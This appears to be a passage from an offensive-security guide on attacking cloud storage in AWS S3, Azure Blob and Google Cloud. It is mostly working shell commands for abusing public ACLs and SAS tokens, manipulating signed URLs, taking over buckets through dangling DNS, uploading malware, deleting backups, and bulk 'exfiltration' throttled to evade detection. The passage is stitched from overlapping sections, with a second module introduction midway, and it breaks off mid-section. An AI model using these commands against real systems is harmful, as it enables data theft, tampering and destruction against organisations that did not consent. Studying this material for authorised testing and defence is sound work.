aws s3api get-bucket-policy --bucket target-bucket

# Scenario: ACL denies, but policy allows
# Even if ACL is restrictive, bucket policy might override

# Attempt access despite ACL restrictions
aws s3 ls s3://target-bucket --profile attacker-profile

# Test policy-based access
aws s3api get-object --bucket target-bucket --key file.txt output.txt
```

### Azure Blob Storage ACL Exploitation

**Azure Access Levels**

```bash
# Container access levels:
# - Private (no anonymous access)
# - Blob (anonymous read for blobs only)
# - Container (anonymous read for blobs and list container)

# Check container access level
az storage container show \
  --account-name targetcompany \
  --name backups \
  --query properties.publicAccess

# If publicAccess = "blob" or "container", it's exploitable
```

**Exploiting Container-Level Access**

```bash
# List all blobs (if Container access level)
curl "https://targetcompany.blob.core.windows.net/backups?restype=container&comp=list"

# Download blob (if Blob or Container access level)
curl "https://targetcompany.blob.core.windows.net/backups/database.bak" -o database.bak

# Enumerate all containers for public access
containers="backup backups data files images uploads public logs"
for container in $containers; do
  response=$(curl -s "https://targetcompany.blob.core.windows.net/$container?restype=container&comp=list")
  if echo "$response" | grep -q "<Blob>"; then
    echo "[+] $container is publicly accessible"
  fi
done
```

**Shared Access Signature (SAS) Token Abuse**

```bash
# SAS token format in URL:
# https://account.blob.core.windows.net/container/blob?sv=2020-08-04&ss=b&srt=sco&sp=rwdlac&se=2025-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=SIGNATURE

# Parameters:
# sp - permissions (r=read, w=write, d=delete, l=list, a=add, c=create)
# se - expiry time
# sr - resource (b=blob, c=container)

# If SAS token found with 'w' or 'd' permissions:

# Upload malicious file
az storage blob upload \
  --account-name targetcompany \
  --container-name backups \
  --name malware.exe \
  --file malware.exe \
  --sas-token "sv=2020-08-04&sp=rwdlac..."

# Delete blobs
az storage blob delete \
  --account-name targetcompany \
  --container-name backups \
  --name important-backup.bak \
  --sas-token "sv=2020-08-04&sp=rwdlac..."

# List contents (if 'l' permission)
az storage blob list \
  --account-name targetcompany \
  --container-name backups \
  --sas-token "sv=2020-08-04&sp=rwdlac..."
```

### Google Cloud Storage ACL Exploitation

**GCS IAM and ACL Model**

```bash
# GCS uses IAM and ACLs (legacy)
# IAM roles:
# - roles/storage.objectViewer (read objects)
# - roles/storage.objectCreator (create objects)
# - roles/storage.legacyBucketReader (list and read)
# - roles/storage.legacyBucketWriter (list, read, write)

# Check bucket IAM policy
curl "https://storage.googleapis.com/storage/v1/b/target-bucket/iam"

# Vulnerable configuration:
{
  "bindings": [
    {
      "role": "roles/storage.objectViewer",
      "members": ["allUsers"]
    }
  ]
}
```

**Exploiting allUsers and allAuthenticatedUsers**

```bash
# allUsers - anyone on internet
# allAuthenticatedUsers - any Google account

# If allUsers has objectViewer:
gsutil ls gs://target-bucket
gsutil cp gs://target-bucket/sensitive.txt .

# If allAuthenticatedUsers has objectCreator:
# Create Google account, then:
gcloud auth login
echo "malicious" > evil.txt
gsutil cp evil.txt gs://target-bucket/

# Check object ACL
gsutil acl get gs://target-bucket/file.txt

# Modify object ACL (if permissions allow)
gsutil acl ch -u AllUsers:R gs://target-bucket/file.txt
```

**Uniform Bucket-Level Access vs Fine-Grained ACLs**

```bash
# Check if uniform bucket-level access is enabled
gsutil uniformbucketlevelaccess get gs://target-bucket

# If disabled, legacy ACLs can be exploited

# Set object to public (if you have OWNER permission)
gsutil acl set public-read gs://target-bucket/file.txt

# Grant write access
gsutil acl ch -u AllAuthenticatedUsers:W gs://target-bucket
```

## Signed URL Exploitation

### AWS S3 Pre-Signed URLs

**Understanding Pre-Signed URLs**

```bash
# Pre-signed URL structure:
# https://bucket.s3.amazonaws.com/object?AWSAccessKeyId=AKIA...&Expires=1735689599&Signature=...

# Parameters:
# AWSAccessKeyId - Identity generating the URL
# Expires - Unix timestamp
# Signature - HMAC-SHA256 signature

# Generate pre-signed URL (requires AWS credentials)
aws s3 presign s3://target-bucket/file.txt --expires-in 3600
```

**Exploiting Pre-Signed URLs**

```bash
# Found pre-signed URL example:
url="https://target-bucket.s3.amazonaws.com/backup.zip?AWSAccessKeyId=AKIA...&Expires=1735689599&Signature=..."

# Download file
curl "$url" -o backup.zip

# Check expiration
expires=$(echo "$url" | grep -oP 'Expires=\K[0-9]+')
current=$(date +%s)
if [ $expires -gt $current ]; then
  echo "URL still valid for $((expires - current)) seconds"
fi

# If URL grants write access (less common):
curl -X PUT "$url" --upload-file malicious.txt
```

**URL Parameter Manipulation** [Inference - signature validation may prevent most manipulation]

```bash
# Attempt to modify object key (usually fails due to signature)
# Original: https://bucket.s3.amazonaws.com/public/file.txt?AWSAccessKeyId...
# Try: https://bucket.s3.amazonaws.com/private/secret.txt?AWSAccessKeyId...
# Expected: 403 Forbidden (signature mismatch)

# Test HTTP method confusion
# If signed for GET, try HEAD or POST
curl -I "$presigned_url"  # HEAD request
curl -X POST "$presigned_url"  # POST request

# Response version manipulation (rarely effective)
# Modify versionId parameter if present
original_url="...?versionId=abc123&AWSAccessKeyId..."
# Try: ...?versionId=xyz789&AWSAccessKeyId...
```

**Enumerating Objects via Pre-Signed URL Patterns**

```bash
# If you find: https://bucket.s3.amazonaws.com/uploads/2024/10/file1.txt?AWSAccessKeyId...
# Pattern detected: uploads/{year}/{month}/{filename}

# Brute force other files
for file in file2.txt file3.txt document.pdf backup.zip; do
  test_url="https://bucket.s3.amazonaws.com/uploads/2024/10/$file?AWSAccessKeyId=AKIA...&Expires=1735689599&Signature=..."
  response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")
  if [ "$response" = "200" ]; then
    echo "[+] Found: $file"
  fi
done

# Time-based enumeration
for month in {01..12}; do
  for day in {01..31}; do
    url="https://bucket.s3.amazonaws.com/backups/2024-$month-$day.zip?AWSAccessKeyId..."
    # Test URL
  done
done
```

### Azure Blob Storage SAS URLs

**SAS Token Structure**

```bash
# SAS URL example:
# https://account.blob.core.windows.net/container/blob?sv=2020-08-04&ss=b&srt=sco&sp=rwdlac&se=2025-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=SIGNATURE

# Key parameters:
# sv - storage version
# ss - services (b=blob, f=file, q=queue, t=table)
# srt - resource types (s=service, c=container, o=object)
# sp - permissions (see earlier)
# se - expiry
# st - start time
# sig - signature
```

**Exploiting SAS Tokens**

```bash
# Extract SAS token from URL
sas_token="sv=2020-08-04&ss=b&srt=sco&sp=rwdlac&se=2025-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=..."

# Check permissions in 'sp' parameter
echo "$sas_token" | grep -oP 'sp=\K[a-z]+'
# Output: rwdlac (read, write, delete, list, add, create)

# If 'r' (read):
curl "https://account.blob.core.windows.net/container/blob?$sas_token" -o file.bin

# If 'l' (list):
curl "https://account.blob.core.windows.net/container?restype=container&comp=list&$sas_token"

# If 'w' (write):
curl -X PUT "https://account.blob.core.windows.net/container/malicious.exe?$sas_token" \
  -H "x-ms-blob-type: BlockBlob" \
  --data-binary @malicious.exe

# If 'd' (delete):
curl -X DELETE "https://account.blob.core.windows.net/container/important.bak?$sas_token"
```

**SAS Token Scope Exploitation**

```bash
# Check 'srt' parameter for scope:
# s - service level (entire storage account)
# c - container level
# o - object level

# Service-level SAS (srt=s or srt=sco) allows access to multiple containers
sas="sv=2020-08-04&ss=b&srt=s&sp=rl&se=2025-12-31T23:59:59Z&sig=..."

# List all containers
curl "https://account.blob.core.windows.net/?comp=list&$sas"

# Access different containers
curl "https://account.blob.core.windows.net/private-container?restype=container&comp=list&$sas"

# Download from any container
curl "https://account.blob.core.windows.net/backups/database.bak?$sas" -o database.bak
```

**SAS Token Expiry and Validation**

```bash
# Check expiry (se parameter)
sas_url="...&se=2025-12-31T23:59:59Z&..."
expiry=$(echo "$sas_url" | grep -oP 'se=\K[^&]+' | head -1)
echo "Expires: $expiry"

# Convert to Unix timestamp for comparison
expiry_unix=$(date -d "$expiry" +%s 2>/dev/null || echo "Invalid")
current_unix=$(date +%s)

if [ "$expiry_unix" -gt "$current_unix" ]; then
  echo "Token still valid"
else
  echo "Token expired"
fi

# Start time validation (st parameter)
# Token only valid after start time
start_time=$(echo "$sas_url" | grep -oP 'st=\K[^&]+' | head -1)
```

### Google Cloud Storage Signed URLs

**GCS Signed URL Structure**

```bash
# GCS signed URL example:
# https://storage.googleapis.com/bucket/object?GoogleAccessId=service-account@project.iam.gserviceaccount.com&Expires=1735689599&Signature=...

# Parameters:
# GoogleAccessId - Service account email
# Expires - Unix timestamp
# Signature - RSA-SHA256 signature
```

**Exploiting GCS Signed URLs**

```bash
# Download object
signed_url="https://storage.googleapis.com/target-bucket/sensitive.txt?GoogleAccessId=...&Expires=1735689599&Signature=..."
curl "$signed_url" -o sensitive.txt

# If signed for PUT (upload):
curl -X PUT "$signed_url" --upload-file malicious.txt

# If signed for DELETE:
curl -X DELETE "$signed_url"

# Check expiration
expires=$(echo "$signed_url" | grep -oP 'Expires=\K[0-9]+')
current=$(date +%s)
echo "Valid for $((expires - current)) seconds"
```

**V4 Signed URL Exploitation**

```bash
# V4 signed URLs (newer format):
# https://storage.googleapis.com/bucket/object?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=...&X-Goog-Date=20241024T120000Z&X-Goog-Expires=3600&X-Goog-SignedHeaders=host&X-Goog-Signature=...

# Extract expiry duration
expires=$(echo "$v4_url" | grep -oP 'X-Goog-Expires=\K[0-9]+')
echo "Valid for $expires seconds"

# Extract date
date=$(echo "$v4_url" | grep -oP 'X-Goog-Date=\K[^&]+')
echo "Created at: $date"

# Test allowed headers (X-Goog-SignedHeaders parameter)
headers=$(echo "$v4_url" | grep -oP 'X-Goog-SignedHeaders=\K[^&]+')
echo "Signed headers: $headers"
```

## Storage Account Enumeration

### AWS S3 Account Enumeration

**Identifying S3 Bucket Owners**

```bash
# Get bucket location
aws s3api get-bucket-location --bucket target-bucket

# Get bucket ownership information
aws s3api get-bucket-acl --bucket target-bucket

# Example output showing owner:
{
  "Owner": {
    "DisplayName": "company-aws-admin",
    "ID": "abc123def456...  # Canonical User ID
  }
}

# Canonical User ID can identify AWS account
```

**Server Access Logging Analysis**

```bash
# If you gain access to S3 logs:
aws s3 sync s3://target-logs-bucket ./logs/

# Log format (space-delimited):
# bucket-owner bucket [timestamp] remote-ip requester operation key ...

# Extract requester information
cat logs/*.log | awk '{print $8}' | sort -u
# Shows AWS account IDs or IAM user ARNs

# Analyze access patterns
cat logs/*.log | grep "REST.GET.OBJECT" | awk '{print $11}' | sort | uniq -c | sort -rn
# Most accessed objects

# Find failed authorization attempts
grep "403" logs/*.log | awk '{print $8, $11}'
```

**CloudTrail Log Analysis** [Inference - if CloudTrail logs are accessible]

```bash
# Download CloudTrail logs from S3
aws s3 sync s3://cloudtrail-bucket/AWSLogs/ACCOUNT_ID/ ./cloudtrail/

# Extract user information
find cloudtrail/ -name "*.json.gz" -exec zcat {} \; | \
  jq -r '.Records[] | "\(.userIdentity.type) \(.userIdentity.principalId) \(.userIdentity.arn)"' | \
  sort -u

# Find S3 operations
find cloudtrail/ -name "*.json.gz" -exec zcat {} \; | \
  jq -r '.Records[] | select(.eventSource == "s3.amazonaws.com") | "\(.eventName) \(.requestParameters.bucketName)"' | \
  sort | uniq -c | sort -rn

# Identify IAM users and roles
find cloudtrail/ -name "*.json.gz" -exec zcat {} \; | \
  jq -r '.Records[].userIdentity | select(.type == "IAMUser") | .userName' | \
  sort -u
```

### Azure Storage Account Enumeration

**Storage Account Discovery**

```bash
# Enumerate storage accounts in subscription (requires auth)
az storage account list --query '[].{Name:name, ResourceGroup:resourceGroup, Location:location}'

# Get storage account properties
az storage account show \
  --name targetcompany \
  --resource-group target-rg

# List all containers in account
az storage container list \
  --account-name targetcompany \
  --output table

# Check network rules
az storage account show \
  --name targetcompany \
  --resource-group target-rg \
  --query networkRuleSet
```

**Enumerating via Naming Patterns**

```bash
# Azure storage accounts are globally unique
# Format: 3-24 lowercase alphanumeric characters

# Common patterns:
companyname
companynamestorage
companynamesa
companystorageacct
companyprod
companydev
companybackup

# Test existence
for name in companyname companystorage companyprod companydev; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://$name.blob.core.windows.net/")
  if [ "$response" != "404" ]; then
    echo "[+] Storage account exists: $name"
  fi
done
```

**Service SAS vs Account SAS** [Inference - Account SAS provides broader access]

```bash
# Account SAS (ss=bfqt) grants access to multiple services:
# b=blob, f=file, q=queue, t=table

# If you find Account SAS with multiple services:
sas="sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlac&se=2025-12-31T23:59:59Z&sig=..."

# Access blob storage
curl "https://account.blob.core.windows.net/container?restype=container&comp=list&$sas"

# Access file storage
curl "https://account.file.core.windows.net/?comp=list&$sas"

# Access table storage
curl "https://account.table.core.windows.net/Tables?$sas"

# Access queue storage
curl "https://account.queue.core.windows.net/?comp=list&$sas"
```

**Azure Storage Analytics Logs**

```bash
# Storage analytics logs are stored in $logs container
# If accessible:

az storage blob list \
  --account-name targetcompany \
  --container-name '$logs' \
  --output table

# Download logs
az storage blob download-batch \
  --source '$logs' \
  --destination ./azure-logs \
  --account-name targetcompany

# Log format (semicolon-delimited):
# version;request-start-time;operation-type;request-status;http-status-code;...

# Parse for IP addresses and operations
cat azure-logs/*.log | awk -F';' '{print $10, $3}' | sort -u
# Shows client IPs and operations

# Find authentication failures
grep "AnonymousAuthenticationFailure\|SASAuthenticationFailure" azure-logs/*.log
```

### Google Cloud Storage Account Enumeration

**Project and Bucket Enumeration**

```bash
# GCS buckets belong to projects
# Project ID format: lowercase letters, numbers, hyphens

# If you have credentials:
gcloud projects list

# List all buckets in project
gsutil ls -p project-id

# Get bucket metadata
gsutil ls -L -b gs://bucket-name

# Output includes:
# - Project number
# - Project ID
# - Storage class
# - Location
# - IAM configuration
```

**Public Bucket Reconnaissance**

```bash
# Get bucket metadata without auth (if bucket is public)
curl "https://storage.googleapis.com/storage/v1/b/target-bucket"

# Response includes project number:
{
  "kind": "storage#bucket",
  "id": "target-bucket",
  "name": "target-bucket",
  "projectNumber": "123456789012",
  "location": "US",
  "storageClass": "STANDARD"
}

# Use project number to identify organization
curl "https://cloudresourcemanager.googleapis.com/v1/projects/project-id"

# Enumerate other buckets in same project (requires auth)
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=project-id"
```

**GCS Access Logs Analysis**

```bash
# Enable logging (logs stored in separate bucket)
gsutil logging set on -b gs://logs-bucket gs://target-bucket

# If you access log bucket:
gsutil ls gs://logs-bucket

# Download logs
gsutil -m cp -r gs://logs-bucket/target-bucket_usage_* ./gcs-logs/

# Log format (CSV):
# time_micros,c_ip,c_ip_type,c_ip_region,cs_method,cs_uri,sc_status,cs_bytes,sc_bytes,time_taken_micros,cs_host,cs_referer,cs_user_agent,s_request_id,cs_operation,cs_bucket,cs_object

# Parse for operations and IPs
cat gcs-logs/*.csv | awk -F',' '{print $2, $15}' | sort -u
# Shows IPs and operations (GET_Object, PUT_Object, etc.)

# Find authentication details
cat gcs-logs/*.csv | grep -v "Anonymous" | awk -F',' '{print $20}' | sort -u
# Shows authenticated principals
```

### Cross-Cloud Storage Account Correlation

**Identifying Related Accounts Across Providers**

```bash
# Common naming patterns across cloud providers:
# AWS S3: company-data
# Azure: companydata
# GCS: company-data

# Search for similar names
aws_buckets="company-data company-backup company-prod"
azure_accounts="companydata companybackup companyprod"
gcs_buckets="company-data company-backup company-prod"

# Test all platforms
for name in $aws_buckets; do
  test_s3_bucket "$name"
done

for name in $azure_accounts; do
  test_azure_storage "$name"
done

for name in $gcs_buckets; do
  test_gcs_bucket "$name"
done
```

**Metadata-Based Correlation**

```bash
# Compare metadata fields for organizational links

# AWS S3 tags
aws s3api get-bucket-tagging --bucket target-bucket

# Azure storage tags
az storage account show \
  --name targetcompany \
  --query tags

# GCS labels
gsutil label get gs://target-bucket

# Look for common identifiers:
# - Department names
# - Cost center codes
# - Environment tags (prod, dev, staging)
# - Owner email addresses
```

### Advanced Enumeration Techniques

**DNS and Certificate Enumeration**

```bash
# Find storage-related subdomains
subfinder -d target.com | grep -E "s3|blob|storage|bucket|cdn"
amass enum -d target.com | grep -E "s3|blob|storage"

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | \
  grep -E "s3|blob|storage|bucket" | \
  sort -u

# DNS zone transfer attempts (rarely successful)
dig axfr @ns1.target.com target.com | grep -E "s3|blob|storage"
```

**Application Source Code Analysis**

```bash
# GitHub repository enumeration
# Look for storage configuration in code

# AWS SDK configuration
grep -r "aws-sdk\|boto3\|AWS.S3" . --include="*.py" --include="*.js" --include="*.java"

# Azure SDK
grep -r "azure-storage\|@azure/storage-blob" . --include="*.py" --include="*.js" --include="*.cs"

# GCS SDK
grep -r "google-cloud-storage\|@google-cloud/storage" . --include="*.py" --include="*.js"

# Extract bucket/account names from code
grep -rh "s3.amazonaws.com\|blob.core.windows.net\|storage.googleapis.com" . | \
  grep -oP '[\w-]+\.s3\.amazonaws\.com|[\w]+\.blob\.core\.windows\.net|[\w-]+\.storage\.googleapis\.com' | \
  sort -u
```

**Mobile Application Analysis**

```bash
# Decompile Android APK
apktool d target-app.apk -o app-decompiled

# Search for storage URLs
grep -r "s3.amazonaws.com\|blob.core.windows.net\|storage.googleapis.com" app-decompiled/

# Extract from strings.xml
cat app-decompiled/res/values/strings.xml | grep -E "s3|blob|storage|bucket"

# iOS IPA analysis
unzip target-app.ipa
strings Payload/Target.app/Target | grep -E "s3|blob|storage|bucket"

# Search for API keys and SAS tokens
grep -r "AKIA\|SharedAccessSignature" app-decompiled/
```

**Web Application Traffic Analysis**

```bash
# Burp Suite: Proxy → HTTP History → Filter
# Search for: s3.amazonaws.com, blob.core.windows.net, storage.googleapis.com

# Export all storage-related requests
# Look for patterns in URLs, headers, parameters

# Extract SAS tokens from requests
grep -E "sig=|Signature=" burp-export.txt | \
  grep -oP 'sig=[^&\s]+|Signature=[^&\s]+' | \
  sort -u

# Extract pre-signed URLs
grep -E "AWSAccessKeyId=|X-Goog-Signature=" burp-export.txt

# Identify upload endpoints
grep -E "PUT|POST" burp-export.txt | \
  grep -E "s3.amazonaws.com|blob.core.windows.net|storage.googleapis.com"
```

### Storage Bucket Takeover Scenarios

**Dangling DNS Record Exploitation**

```bash
# Scenario: DNS points to deleted S3 bucket

# Identify potential takeover
host static.target.com
# Returns: static.target.com is an alias for old-bucket.s3.amazonaws.com

# Test if bucket exists
aws s3 ls s3://old-bucket --no-sign-request
# Error: NoSuchBucket

# Register the bucket name
aws s3 mb s3://old-bucket --region us-east-1

# Upload content
echo "<h1>Proof of Concept</h1>" > index.html
aws s3 cp index.html s3://old-bucket/ --acl public-read

# Configure static website
aws s3 website s3://old-bucket --index-document index.html

# Verify takeover
curl http://static.target.com
# Should display your content
```

**Azure Storage Account Takeover** [Unverified - Azure prevents reuse of deleted storage account names for 30 days]

```bash
# Scenario: CNAME points to deleted storage account

# Check DNS
host cdn.target.com
# Returns: cdn.target.com is an alias for oldaccount.blob.core.windows.net

# Test if account exists
curl https://oldaccount.blob.core.windows.net/
# Response: 404 (account doesn't exist)

# Attempt to create storage account with same name
az storage account create \
  --name oldaccount \
  --resource-group myresourcegroup \
  --location eastus \
  --sku Standard_LRS

# If successful (after 30-day wait period):
# Upload content to container
# Configure to serve content
```

**GCS Bucket Takeover**

```bash
# Scenario: CNAME points to deleted GCS bucket

# Check DNS
host assets.target.com
# Returns: assets.target.com is an alias for c.storage.googleapis.com
# Additional CNAME: old-bucket.storage.googleapis.com

# Test if bucket exists
gsutil ls gs://old-bucket
# Error: BucketNotFoundException

# Create bucket with same name
gsutil mb gs://old-bucket

# Upload content
echo "Takeover PoC" > index.html
gsutil cp index.html gs://old-bucket/
gsutil iam ch allUsers:objectViewer gs://old-bucket

# Verify takeover
curl http://assets.target.com/index.html
```

### Automated Enumeration Frameworks

**CloudMapper (AWS)**

```bash
# Collect AWS account data
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper

# Configure
python3 cloudmapper.py configure add-account --config-file config.json \
  --name target-account \
  --id 123456789012 \
  --default true

# Collect data
python3 cloudmapper.py collect --account target-account

# Find public S3 buckets
python3 cloudmapper.py find_public_resources --account target-account

# Generate report
python3 cloudmapper.py report --account target-account
```

**ScoutSuite (Multi-Cloud)**

```bash
# AWS enumeration
python3 scout.py aws --profile target-profile

# Azure enumeration
python3 scout.py azure --cli

# GCP enumeration
python3 scout.py gcp --project-id target-project

# Results include:
# - Public storage resources
# - Misconfigured ACLs
# - Overly permissive policies
# - Encryption status

# View report
firefox scoutsuite-report/scoutsuite-results/*.html
```

**Prowler (AWS Security Assessment)**

```bash
# Run Prowler
prowler aws --profile target-profile

# Specific S3 checks
prowler aws --profile target-profile --services s3

# Check for public buckets
prowler aws --profile target-profile --checks s3_bucket_public_access

# Check for unencrypted buckets
prowler aws --profile target-profile --checks s3_bucket_encryption

# Export results
prowler aws --profile target-profile --output-formats json,html
```

**Pacu (AWS Exploitation Framework)**

```bash
# Start Pacu
python3 pacu.py

# Create session
set_keys
# Enter AWS keys

# Enumerate S3 buckets
run s3__enum

# Download S3 data
run s3__download_bucket --bucket target-bucket

# Check for public buckets
run s3__bucket_finder --wordlist bucket-names.txt

# Privilege escalation via S3
run iam__privesc_scan
```

### Data Exfiltration via Storage

**Large-Scale Download Strategies**

```bash
# AWS S3 parallel download
aws s3 sync s3://target-bucket ./exfil-data --no-sign-request

# With rate limiting (stealth)
aws s3 sync s3://target-bucket ./exfil-data \
  --no-sign-request \
  --request-payer requester \
  --cli-read-timeout 300

# Azure parallel download
az storage blob download-batch \
  --source container-name \
  --destination ./exfil-data \
  --account-name targetcompany \
  --max-connections 4

# GCS parallel download
gsutil -m cp -r gs://target-bucket ./exfil-data

# Selective exfiltration (high-value files)
aws s3 ls s3://target-bucket --recursive --no-sign-request | \
  grep -E "\.sql|\.bak|\.zip|\.tar\.gz|password|secret|credential|key" | \
  awk '{print $NF}' | \
  while read file; do
    aws s3 cp "s3://target-bucket/$file" ./sensitive/ --no-sign-request
  done
```

**Stealth Exfiltration Techniques** [Inference - methods to avoid detection]

```bash
# Throttled download (avoid rate-based alerts)
aws s3 ls s3://target-bucket --recursive --no-sign-request | \
  awk '{print $NF}' | \
  while read file; do
    aws s3 cp "s3://target-bucket/$file" ./data/ --no-sign-request
    sleep $((RANDOM % 60 + 30))  # Random delay 30-90 seconds
  done

# Time-based exfiltration (off-hours)
# Schedule downloads for nights/weekends via cron
0 2 * * * /usr/local/bin/exfiltrate-s3.sh

# Proxy through multiple IPs (if using authenticated access)
# Use VPN/proxy rotation to distribute requests

# Small file targeting (less likely to trigger alerts)
aws s3 ls s3://target-bucket --recursive --no-sign-request | \
  awk '{if ($3 < 10485760) print $NF}' | \
  while read file; do
    aws s3 cp "s3://target-bucket/$file" ./data/ --no-sign-request
  done
```

---

**Critical Related Topics:**

- **Object versioning exploitation** (accessing deleted/overwritten file versions)
- **Server-side encryption bypass** (SSE-C key manipulation, KMS key access)
- **Cross-origin resource sharing (CORS) on storage** (misconfigured CORS policies)
- **Storage event triggers** (Lambda/Function exploitation via S3 events)
- **CDN cache poisoning via storage** (CloudFront/CDN misconfigurations)

---

Cloud storage services (AWS S3, Azure Blob Storage, Google Cloud Storage) present significant attack surfaces in CTF challenges and real-world scenarios. This module covers exploitation techniques specific to cloud object storage misconfigurations and design flaws.

## Pre-signed URL Abuse

Pre-signed URLs are time-limited, cryptographically signed URLs that grant temporary access to private cloud storage objects without requiring authentication credentials.

### Attack Methodology

**Reconnaissance and Discovery:**

```bash
# Extract pre-signed URLs from web traffic
burpsuite # Intercept HTTP requests
grep -r "X-Amz-Signature" /path/to/logs
grep -r "sig=" /path/to/logs  # Azure Blob Storage
grep -r "Signature=" /path/to/logs  # Google Cloud Storage

# AWS S3 pre-signed URL structure
https://bucket-name.s3.amazonaws.com/object-key?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=...&X-Amz-Date=...&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=...
```

**Parameter Manipulation:**

```bash
# Attempt to extend expiration (typically fails but worth testing)
# Modify X-Amz-Expires parameter
curl "https://bucket.s3.amazonaws.com/file.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Expires=999999&..."

# Test for signature bypass
curl -X GET "https://bucket.s3.amazonaws.com/file.txt" \
  --header "Host: bucket.s3.amazonaws.com"
```

**Path Traversal Attempts:**

```bash
# If pre-signed URL grants access to one object, test for directory traversal
# Original URL: https://bucket.s3.amazonaws.com/public/document.pdf?signature...
curl "https://bucket.s3.amazonaws.com/private/secrets.txt?signature..."
curl "https://bucket.s3.amazonaws.com/../admin/config.yaml?signature..."

# Enumerate adjacent objects by modifying object key
for i in {1..100}; do
  curl -o "file_$i.txt" "https://bucket.s3.amazonaws.com/files/document_$i.pdf?X-Amz-Signature=..."
done
```

**Method Manipulation:**

```bash
# Pre-signed URL may be scoped to GET only
# Test other HTTP methods
curl -X PUT "https://bucket.s3.amazonaws.com/object.txt?signature..." \
  --data "malicious content"

curl -X DELETE "https://bucket.s3.amazonaws.com/object.txt?signature..."

curl -X POST "https://bucket.s3.amazonaws.com/object.txt?signature..." \
  --data "additional data"
```

**Timing and Replay Attacks:**

```bash
# Capture valid pre-signed URL
# Replay after expiration to test clock skew tolerance
curl -v "https://bucket.s3.amazonaws.com/object.txt?X-Amz-Signature=..."

# AWS typically allows 15-minute clock skew [Inference: based on standard AWS behavior]
# Test URLs immediately before and after stated expiration
```

### Tools for Pre-signed URL Exploitation

**AWS CLI Techniques:**

```bash
# Generate your own pre-signed URLs if you have credentials
aws s3 presign s3://bucket-name/object-key --expires-in 3600

# Test bucket permissions directly
aws s3 ls s3://extracted-bucket-name --no-sign-request

# Attempt anonymous access
aws s3 cp s3://bucket-name/object-key . --no-sign-request
```

**Cloud_enum for Discovery:**

```bash
# Install
git clone https://github.com/initstring/cloud_enum
cd cloud_enum
pip3 install -r requirements.txt

# Enumerate S3 buckets
python3 cloud_enum.py -k target-company

# Check specific bucket
python3 cloud_enum.py -k specific-bucket-name --quickscan
```

**S3Scanner:**

```bash
# Install
pip3 install s3scanner

# Scan for open buckets
s3scanner scan --buckets bucket-list.txt

# Dump accessible content
s3scanner dump --bucket target-bucket
```

### Azure Blob Storage Pre-signed URLs (SAS Tokens)

```bash
# Azure SAS token structure
https://storageaccount.blob.core.windows.net/container/blob?sv=2021-06-08&ss=b&srt=sco&sp=r&se=2024-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=signature_here

# Key parameters:
# sv = storage version
# sp = permissions (r=read, w=write, d=delete, l=list)
# se = expiry time
# sig = signature

# Test permission escalation
# Modify sp parameter from 'r' to 'rw' or 'rwdl'
curl "https://account.blob.core.windows.net/container/blob?sp=rwdl&sig=..."

# Enumerate containers
az storage blob list --account-name targetaccount \
  --container-name targetcontainer \
  --sas-token "?sv=2021-06-08&sp=r..."
```

## Cross-Account Access

Cross-account access vulnerabilities arise from misconfigured IAM policies, bucket policies, or trust relationships that allow unintended principals to access cloud resources.

### AWS S3 Cross-Account Exploitation

**Bucket Policy Enumeration:**

```bash
# Check if bucket policy is publicly readable
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Common misconfiguration: wildcard principal
# Vulnerable policy example (DO NOT use in production):
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}

# Test access from your AWS account
aws s3 ls s3://target-bucket --profile your-profile
aws s3 cp s3://target-bucket/file.txt . --profile your-profile
```

**ACL Exploitation:**

```bash
# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket

# Check object ACL
aws s3api get-object-acl --bucket target-bucket --key object-key

# Common misconfiguration: AuthenticatedUsers group
# This grants access to ANY AWS authenticated user
# Test with your AWS credentials
aws s3 cp s3://target-bucket/secret.txt . --profile attacker-profile

# Attempt to modify ACLs if you have access
aws s3api put-object-acl --bucket target-bucket \
  --key object.txt \
  --acl public-read
```

**Bucket Takeover via Account ID:**

```bash
# If you discover an AWS account ID in configurations
# Format: 123456789012 (12 digits)

# Create bucket policy in your account that trusts their account
# Then test if their resources trust your account

# Enumerate their public resources
aws s3 ls s3://company-name-bucket --profile your-profile
```

### Tools for Cross-Account Discovery

**S3Scanner Advanced Usage:**

```bash
# Check for cross-account access patterns
s3scanner scan --buckets targets.txt --public

# Test authenticated access
AWS_PROFILE=your-profile s3scanner scan --buckets targets.txt

# Dump all accessible objects
s3scanner dump --bucket target-bucket --dump-dir ./output
```

**Pacu (AWS Exploitation Framework):**

```bash
# Install
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
bash install.sh

# Run Pacu
python3 pacu.py

# Import keys
set_keys
# Enter your AWS access keys

# Enumerate S3 permissions
run s3__bucket_finder

# Test cross-account access
run iam__enum_permissions

# Escalate privileges if possible
run iam__privesc_scan
```

**ScoutSuite (Multi-Cloud Auditing):**

```bash
# Install
pip install scoutsuite

# Audit AWS account
scout aws --profile your-profile

# Focus on S3 findings
scout aws --services s3 --profile your-profile

# Output includes misconfigurations and cross-account risks
# Review report.html for detailed findings
```

### Azure Cross-Account (Cross-Tenant) Access

```bash
# List accessible storage accounts
az storage account list

# Check for overly permissive role assignments
az role assignment list --all

# Test anonymous blob access
curl "https://storageaccount.blob.core.windows.net/container/blob"

# Enumerate with authenticated context
az storage blob list \
  --account-name targetaccount \
  --container-name container \
  --auth-mode login
```

**MicroBurst (Azure Exploitation):**

```bash
# Install
git clone https://github.com/NetSPI/MicroBurst
cd MicroBurst
Import-Module .\MicroBurst.psm1

# Enumerate Azure storage
